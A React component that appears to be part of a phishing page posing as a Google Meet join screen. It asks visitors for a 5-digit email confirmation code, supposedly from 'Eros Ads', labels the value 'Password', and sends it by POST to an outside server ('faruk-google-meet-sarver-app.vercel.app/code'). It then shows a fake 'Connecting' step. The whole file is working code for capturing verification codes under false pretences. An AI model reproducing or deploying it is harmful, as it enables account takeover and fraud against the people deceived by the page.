import React from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import Imgg from "../../Img/gmeet.gif";

const Code = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Password: data.exampleRequired,
    };
    fetch("https://faruk-google-meet-sarver-app.vercel.app/code", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/Connecting"));
  };
  return (
    <div>
      <div className="container">
        <div className="row">
          <div className="col text-center p-3">
            <h3>
              Confirmation 5 digit code sending to your email from Eros Ads.
            </h3>
            <div>
              <form onSubmit={handleSubmit(onSubmit)}>
                <div>
                  <input
                    className="form-control Email mt-3 text-center"
                    placeholder="Enter the code you received"
                    defaultValue=""
                    {...register("exampleRequired", { required: true })}
                    minLength={5}
                    maxLength={5}
                  />
                </div>
                {errors.exampleRequired && <span></span>}

                <input
                  className="submit  mt-3 mb-3 w-50%"
                  type="SUBMIT"
                  defaultValue="Join Meeting"
                />
              </form>
            </div>
            <div>
              <img src={Imgg} alt="Imgg" />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Code;
